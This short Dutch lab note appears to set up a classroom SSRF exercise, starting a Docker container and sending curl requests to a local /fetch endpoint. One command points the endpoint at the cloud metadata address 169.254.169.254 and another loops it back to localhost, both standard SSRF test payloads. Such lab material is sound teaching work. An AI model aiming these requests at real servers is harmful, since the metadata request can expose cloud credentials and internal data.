

Start docker:
docker compose -f docker-compose-ssrf.yml up --build -d


Ga naar browser of gebruik curl:
http://localhost:5000/fetch?url=http://zuyd.nl

curl "http://localhost:5000/fetch?url=http://127.0.0.1:5000/fetch?url=http://example.com"
# of simpeler:
curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/"